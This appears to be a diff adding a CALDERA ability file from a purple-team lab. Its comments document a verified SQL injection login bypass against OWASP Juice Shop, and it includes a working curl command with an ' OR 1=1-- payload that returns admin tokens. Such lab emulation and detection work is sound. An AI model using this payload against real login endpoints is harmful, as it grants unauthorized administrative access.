@@ -1,0 +1,44 @@
+# CALDERA ability definition: Juice Shop SQL Injection Login Bypass
+#
+# This ability lives inside control-node's CALDERA database, not
+# anywhere on disk automatically -- if control-node's Elasticsearch/
+# CALDERA data volume is ever wiped or the instance rebuilt from a
+# fresh disk, this ability is lost unless recreated. This file is the
+# durable record, meant to be re-imported (via CALDERA's UI or the
+# /api/v2/abilities endpoint) after any such rebuild.
+#
+# Verified working 2026-09-11: achieved a full, unauthenticated admin
+# login on OWASP Juice Shop (web-target) via SQL injection, run from
+# both linux-workstation-target and web-target itself (both in group
+# "red"). Real JWT tokens with role: admin returned both times.
+# Corroborated independently via Elastic Defend (source-side process
+# execution) and nginx access logs (destination-side HTTP request,
+# 200 response) -- see docs/07-troubleshooting-log.md and
+# ~/purple-team-lab-evidence/2026-09-11-juice-shop-sqli/ for full
+# evidence.
+
+id: 77f2e364-441f-4b19-8a53-d56640123bc5
+name: Juice Shop SQL Injection Login Bypass
+description: >
+  Exploit a classic SQL injection vulnerability in OWASP Juice Shop's
+  login endpoint to bypass authentication without valid credentials.
+tactic: initial-access
+technique:
+  attack_id: T1059.004
+  name: "Command and Scripting Interpreter: Bash"
+  # Note: T1190 (Exploit Public-Facing Application) and T1212
+  # (Exploitation for Credential Access) are more semantically precise
+  # matches for what this ability actually does, but neither was
+  # selectable in this CALDERA instance's technique picker -- it
+  # appears scoped to techniques already in use by existing stockpile
+  # abilities, not the full MITRE ATT&CK catalog. T1059.004 was used
+  # as the closest available match; the name/description fields carry
+  # the real intent.
+singleton: false
+repeatable: false
+platforms:
+  linux:
+    sh:
+      command: |
+        curl -sk -X POST https://web-target/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
+      timeout: 60
